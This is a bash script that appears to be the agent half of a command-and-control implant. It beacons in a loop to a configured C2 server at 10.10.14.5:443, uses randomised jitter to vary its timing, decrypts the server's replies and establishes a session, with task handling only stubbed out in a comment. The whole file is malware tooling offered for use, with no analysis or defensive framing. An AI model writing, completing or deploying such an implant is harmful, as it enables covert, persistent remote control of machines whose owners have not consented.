#!/bin/bash

# Configuration
SERVER_URL="https://10.10.14.5:443"
AUTH_TOKEN="your-auth-token-here"
ENCRYPTION_PASSWORD="your-encryption-password-here"
BEACON_INTERVAL=60
JITTER=30

# Source functions
source ./functions.sh

# Main beacon loop
start_agent() {
    local session_id=""
    
    echo "[*] Agent starting..."
    echo "[*] Server: $SERVER_URL"
    echo "[*] Beacon Interval: $BEACON_INTERVAL seconds (± $JITTER seconds jitter)"
    
    while true; do
        # Send beacon
        local response=$(send_beacon "$session_id")
        
        if [ -n "$response" ] && [ "$response" != "null" ]; then
            # Extract session ID if new
            if [ -z "$session_id" ]; then
                # Decrypt response
                local encrypted_data=$(extract_json_value "$response" "data")
                if [ -n "$encrypted_data" ]; then
                    local decrypted=$(decrypt_data "$encrypted_data")
                    session_id=$(extract_json_value "$decrypted" "session_id")
                    
                    if [ -n "$session_id" ]; then
                        echo "[+] Session established: $session_id"
                    fi
                fi
            fi
            
            # Check for tasks
            # (Simplified - full implementation would parse JSON array)
            # For production, use jq or python for JSON parsing
        fi
        
        # Calculate next beacon time with jitter
        local jitter_amount=$((RANDOM % (JITTER * 2) - JITTER))
        local sleep_time=$((BEACON_INTERVAL + jitter_amount))
        
        if [ $sleep_time -lt 1 ]; then
            sleep_time=1
        fi
        
        sleep $sleep_time
    done
}

# Start the agent
start_agent